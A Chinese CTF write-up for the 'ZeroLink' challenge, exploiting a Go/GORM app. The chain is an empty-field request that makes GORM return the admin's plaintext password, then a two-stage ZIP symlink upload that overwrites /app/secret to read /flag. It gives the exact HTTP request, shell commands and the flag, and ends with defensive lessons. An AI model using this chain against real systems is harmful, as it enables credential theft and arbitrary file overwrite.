# ZeroLink

## 题目简述

题目是 Go/GORM Web 应用。利用链由两个独立问题组成：

1. GORM 使用结构体作为查询条件时默认忽略零值字段，传入空 `username` 与空 `token` 会退化为 `SELECT * FROM user LIMIT 1`，泄露初始化表中的第一个用户 Admin 及其密码；
2. 管理后台会把上传的 ZIP 以 `unzip -o ... -d /tmp/` 解压，并保留、跟随符号链接。分两次上传压缩包，可以经 `/tmp/link -> /app` 覆盖 `/app/secret`，令读文件接口转而读取 `/flag`。

## 解题过程

### 利用 GORM 零值语义取得管理员密码

用户查询函数的核心逻辑为：

```go
func GetUserByUsernameOrToken(username string, token string) (*User, error) {
    var user User
    query := db
    if username != "" {
        query = query.Where(&User{Username: username})
    } else {
        query = query.Where(&User{Token: token})
    }

    err := query.First(&user).Error
    if err != nil {
        return nil, err
    }
    return &user, nil
}
```

正常情况下，`username="agu"` 会生成：

```sql
SELECT * FROM `user` WHERE `username` = 'agu' LIMIT 1;
```

但 `token` 是 Go 字符串，空字符串是其零值。GORM 使用非指针结构体构造条件时默认不把零值字段加入 `WHERE`，因此当 `username` 和 `token` 都为空，`Where(&User{Token: ""})` 不产生有效条件，最终查询退化为：

```sql
SELECT * FROM `user` LIMIT 1;
```

向 `/api/user` 发送：

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{"username":"","token":""}
```

响应返回 ID 为 1 的 Admin 用户对象，其中包含明文密码。使用该密码登录后台。

### 两阶段符号链接覆盖

审计路由可发现隐藏的 `/api/unzip` 与 `/api/secret`。前者执行的效果相当于：

```go
exec.Command("unzip", "-o", zipPath, "-d", "/tmp/")
```

后者读取 `/app/secret` 中记录的路径，再返回该路径指向的文件；初始值只会指向 `fake_flag`。

第一份 ZIP 保存一个名为 `link`、指向 `/app` 的符号链接：

```bash
ln -s /app link
zip --symlinks 1.zip link
```

上传 `1.zip` 并调用 `/api/unzip` 后，服务器上得到 `/tmp/link -> /app`。

制作第二份 ZIP 时，使用普通目录 `link`，在其中创建内容为 `/flag` 的 `secret`：

```bash
rm link
mkdir link
printf '/flag' > link/secret
zip -r 2.zip link
```

上传并解压 `2.zip`。由于 `/tmp/link` 已是指向 `/app` 的符号链接，解压器写入 `/tmp/link/secret` 时实际覆盖 `/app/secret`。此后请求 `/api/secret`，应用会读取 `/flag`，返回：

```text
hgame{w0W_u_Re4l1y_Kn0W_Golang_4ND_uNz1P!}
```

## 方法总结

- Go 的零值本身不是漏洞；漏洞来自“把零值结构体交给 ORM 生成安全关键查询”并误以为该字段仍会作为条件。
- 对登录、鉴权或用户查询，应该使用显式 SQL 条件、指针/Map 表达“字段是否出现”，并禁止返回密码等敏感字段。
- ZIP Slip 不只包括 `../` 路径穿越；保留符号链接且允许覆盖同样可把后续文件写出目标目录。
- 两阶段压缩包的顺序不可交换：第一阶段先在目标机建立链接，第二阶段才让解压器沿链接覆盖真实文件。
